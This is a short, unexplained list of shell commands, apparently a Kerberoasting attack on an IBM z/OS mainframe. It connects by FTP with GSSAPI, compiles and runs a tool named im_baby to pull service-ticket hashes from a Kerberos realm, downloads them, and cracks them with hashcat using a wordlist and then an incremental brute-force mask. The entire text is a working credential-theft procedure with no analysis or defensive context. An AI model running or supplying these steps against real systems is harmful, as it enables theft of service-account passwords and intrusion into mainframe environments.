ftp zos.jake.net -a gssapi -v

c89 -2 -DS390 -Wc,"DLL,NOANSIALIAS" -Wl,DLL -o im_baby im_baby.c /usr/lib/EUVFKDLL.x -lskrb

./im_baby JAKE.NET jake JAKE spns hosts

get krb5_hashcat

hashcat -m 19700 -a 0 krb5_hashcat password --potfile-disable

hashcat -a 3 -m 19700  krb5_hashcat -1 ?u?d ?1?1?1?1?1?1?1?1 --potfile-disable --increment
